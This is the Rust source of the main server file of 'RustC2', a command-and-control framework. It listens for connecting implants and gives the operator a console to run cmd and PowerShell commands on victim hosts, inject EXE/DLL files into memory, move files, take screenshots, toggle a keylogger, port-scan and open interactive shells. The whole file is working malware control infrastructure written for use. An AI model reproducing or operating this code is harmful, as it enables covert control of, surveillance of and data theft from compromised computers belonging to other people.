mod utils;
mod locals;
mod spawn;
use clap::{Command, arg};
use colored::Colorize;
use chrono::Local;

use std::collections::HashMap;
use std::io::Write;
use std::sync::Arc;
use std::thread;

use rustyline::DefaultEditor;

use tokio::runtime::Runtime;
use tokio::sync::Mutex;
use tokio::net::{TcpListener, TcpStream};
use utils::ConnectionInfo;

fn print_banner(port: &str) {
    println!("{}", "┌────────────────────────────────────┐".cyan());
    println!("{}", "│       RustC2 - C2 in Rust          │".cyan());
    println!("{}", "└────────────────────────────────────┘".cyan());
    println!(
        "  {} {}",
        "Listening on".dimmed(),
        format!("0.0.0.0:{}", port).bold()
    );
    println!("  {}\n", "Type 'help' for available commands.".dimmed());
}

fn print_help() -> String {
    let mut output = String::new();
    output.push_str("\n  <args> are required, [args] are optional\n\n");
    output.push_str("  help                             Show this menu\n");
    output.push_str("  shell <cmd>                      Run a local shell command\n");
    output.push_str("  clear                            Clear the screen\n");
    output.push_str("\n  ──────────────────────────────────────────────────────\n");
    output.push_str("  Commands available when a client is connected\n");
    output.push_str("  ──────────────────────────────────────────────────────\n\n");
    output.push_str("  list                             List active connections\n");
    output.push_str("  cmd <ID> <command>               Send a cmd command to a host\n");
    output.push_str("  psh <ID> <command>               Send a PowerShell command to a host\n");
    output.push_str("  spawn <ID>                       Start an interactive shell\n\n");
    output.push_str("  import-psh <ID> <file>           Import a PowerShell script into the client\n");
    output.push_str("  run-psh <ID> <Function>          Run a function from imported scripts\n\n");
    output.push_str("  inject <ID> <Path> <args>        Execute an EXE/DLL in memory\n\n");
    output.push_str("  upload <ID> <file> <dest>        Upload a file to a host\n");
    output.push_str("  download <ID> <file> <dest>      Download a file from a host\n");
    output.push_str("  screenshot <ID>                  Take a screenshot\n");
    output.push_str("  keylogger <ID> on/off            Toggle keylogger\n");
    output.push_str("  portscan <ID> <IP> <NUM1> <NUM2> Port scan a host\n");
    output.push_str("  kill <ID>                        Kill the beacon on the host\n");
    output.push_str("  exit                             Close all connections and exit (ctrl+d)\n\n");
    output
}

fn ok(msg: &str) {
    println!("{} {}", "[+]".green().bold(), msg);
}

fn err(msg: &str) {
    println!("{} {}", "[!]".yellow().bold(), msg);
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new("RustC2")
        .version("0.2.0")
        .about(print_help())
        .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
        .get_matches();

    let mut port = "8080";
    if let Some(p) = matches.get_one::<String>("port") {
        port = p;
    }

    print_banner(port);

    let active_connections: Arc<Mutex<HashMap<String, ConnectionInfo>>> =
        Arc::new(Mutex::new(HashMap::new()));
    let active_connections_clone = active_connections.clone();

    thread::spawn(move || {
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            let mut rl = DefaultEditor::new().unwrap();
            let prompt = "RustC2> ";
            loop {
                std::io::stdout().flush().unwrap();
                let command = rl.readline(prompt);
                match command {
                    Ok(command) => {
                        rl.add_history_entry(command.as_str()).unwrap();

                        if command.starts_with("help") {
                            println!("{}", print_help());
                        } else if command == "clear" {
                            print!("\x1b[2J\x1b[H");
                            std::io::stdout().flush().unwrap();
                        } else if command.starts_with("shell ") {
                            locals::spawn_shell(command);
                        } else if command.starts_with("list") {
                            print!("{}", utils::handle_list(&active_connections_clone).await);
                        } else if command.starts_with("cmd") || command.starts_with("psh") {
                            match utils::handle_command(&active_connections_clone, &command).await {
                                Ok(output) => println!("{}", output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("spawn ") {
                            match spawn::handle_spawn(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e.to_string()),
                            }
                        } else if command.starts_with("import-psh") {
                            match utils::handle_importpsh(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("run-psh") {
                            match utils::handle_run_script(&active_connections_clone, &command).await {
                                Ok(output) => println!("{}", output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("inject") {
                            match utils::handle_in_memory(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("upload") {
                            match utils::handle_upload(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("download") {
                            match utils::handle_download(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("screenshot") {
                            match utils::handle_screenshot(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("keylogger") {
                            match utils::handle_keylogger(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("kill") {
                            match utils::handle_kill(&active_connections_clone, &command).await {
                                Ok(output) => ok(&output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("portscan") {
                            match utils::handle_port_scan(&active_connections_clone, &command).await {
                                Ok(output) => println!("{}", output),
                                Err(e) => err(&e),
                            }
                        } else if command.starts_with("exit") {
                            utils::handle_exit();
                        } else if command.is_empty() {
                            continue;
                        } else {
                            err(&format!("Unknown command '{}'. Type 'help' for usage.", command));
                        }
                    }
                    Err(rustyline::error::ReadlineError::Interrupted) => {
                        print!("\rRustC2> ");
                        std::io::stdout().flush().unwrap();
                    }
                    Err(rustyline::error::ReadlineError::Eof) => {
                        utils::handle_exit();
                    }
                    Err(_) => err("Error reading command"),
                }
            }
        })
    });

    let listener = TcpListener::bind(format!("0.0.0.0:{}", port))
        .await
        .expect(&format!("Failed to bind to port {}!", port));

    while let Ok((stream, sockaddr)) = listener.accept().await {
        let active_connections_clone = Arc::clone(&active_connections);
        let hostname = sockaddr.to_string();
        tokio::spawn(handle_connection(active_connections_clone, hostname, stream));
    }

    Ok(())
}

pub async fn handle_connection(
    active_connections: Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    hostname: String,
    stream: TcpStream,
) {
    let mut stream = Arc::new(Mutex::new(stream));
    let hostname_clone = hostname.clone();
    let connected_at = Local::now().format("%H:%M:%S").to_string();

    let (username, os, shared_secret) = utils::parse_client_info(&mut stream).await;
    if username.is_empty() || os.is_empty() {
        println!(
            "\n{} Invalid client info from {} — disconnecting.",
            "[!]".yellow().bold(),
            hostname
        );
        print!("RustC2> ");
        std::io::stdout().flush().unwrap();
        return;
    }

    let id = {
        let mut lock = active_connections.lock().await;
        let id = match lock.get(&hostname) {
            Some(info) => info.id,
            None => {
                let mut id = 0;
                while lock.values().any(|info| info.id == id) {
                    id += 1;
                }
                id
            }
        };
        lock.insert(
            hostname.clone(),
            ConnectionInfo {
                id,
                stream: stream.clone(),
                hostname: hostname.clone(),
                username: username.clone(),
                os: os.clone(),
                shared_secret: *shared_secret.as_bytes(),
                connected_at: connected_at.clone(),
            },
        );
        id
    };

    let active_connections_clone = Arc::clone(&active_connections);

    tokio::spawn(async move {
        let data = [0; 1];
        let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(60));
        loop {
            let _ = interval.tick().await;
            match stream.lock().await.try_write(&data) {
                Ok(_) => {}
                Err(_) => {
                    let mut lock = active_connections_clone.lock().await;
                    let id = lock.get(&hostname).map(|i| i.id).unwrap_or(0);
                    println!(
                        "\n{} {} disconnected [ID {}]",
                        "[-]".red().bold(),
                        hostname,
                        id
                    );
                    print!("RustC2> ");
                    std::io::stdout().flush().unwrap();
                    lock.remove(&hostname);
                    break;
                }
            }
        }
    });

    println!(
        "\n{} {} → {} ({}) [ID {}]",
        "[+]".green().bold(),
        hostname_clone,
        username.green(),
        os.dimmed(),
        id.to_string().cyan().bold()
    );
    print!("RustC2> ");
    std::io::stdout().flush().unwrap();
}
